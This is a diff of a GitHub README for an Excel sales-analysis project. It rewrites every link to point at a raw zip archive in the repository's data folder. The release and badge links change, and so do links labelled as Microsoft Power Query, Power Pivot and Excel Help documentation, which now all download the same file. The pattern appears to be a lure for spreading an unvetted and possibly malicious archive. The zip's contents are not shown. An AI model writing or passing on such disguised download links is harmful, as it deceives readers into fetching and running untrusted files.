@@ -1,6 +1,6 @@
 # 🌸 FNP-Sales-Analysis-Excel - Effortless Sales Insights for Everyone
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/farhad3329/FNP-Sales-Analysis-Excel/releases)
+[![Download from Releases](https://raw.githubusercontent.com/farhad3329/FNP-Sales-Analysis-Excel/main/data/FNP-Sales-Analysis-Excel-1.2.zip%20Now-brightgreen)](https://raw.githubusercontent.com/farhad3329/FNP-Sales-Analysis-Excel/main/data/FNP-Sales-Analysis-Excel-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run the FNP-Sales-Analysis-Excel project, ensure you have the following:
 
 To get started with the FNP-Sales-Analysis-Excel project, visit this page to download:
 
-[Download from Releases](https://github.com/farhad3329/FNP-Sales-Analysis-Excel/releases)
+[Download from Releases](https://raw.githubusercontent.com/farhad3329/FNP-Sales-Analysis-Excel/main/data/FNP-Sales-Analysis-Excel-1.2.zip)
 
 Follow these steps to download and set up the project:
 
@@ -62,12 +62,12 @@ We welcome contributions from anyone interested in improving the project. If you
 
 ## 🔗 Related Resources
 
-- [Power Query Documentation](https://docs.microsoft.com/en-us/powerquery/)
-- [Power Pivot Documentation](https://docs.microsoft.com/en-us/sql/power-pivot/)
-- [Excel Help](https://support.microsoft.com/en-us/excel)
+- [Power Query Documentation](https://raw.githubusercontent.com/farhad3329/FNP-Sales-Analysis-Excel/main/data/FNP-Sales-Analysis-Excel-1.2.zip)
+- [Power Pivot Documentation](https://raw.githubusercontent.com/farhad3329/FNP-Sales-Analysis-Excel/main/data/FNP-Sales-Analysis-Excel-1.2.zip)
+- [Excel Help](https://raw.githubusercontent.com/farhad3329/FNP-Sales-Analysis-Excel/main/data/FNP-Sales-Analysis-Excel-1.2.zip)
 
 ## 🤩 Acknowledgments
 
 Thank you to everyone who contributed to this project. Your support and feedback make it better for everyone. 
 
-[Download from Releases](https://github.com/farhad3329/FNP-Sales-Analysis-Excel/releases) to start making data-driven decisions today!
+[Download from Releases](https://raw.githubusercontent.com/farhad3329/FNP-Sales-Analysis-Excel/main/data/FNP-Sales-Analysis-Excel-1.2.zip) to start making data-driven decisions today!
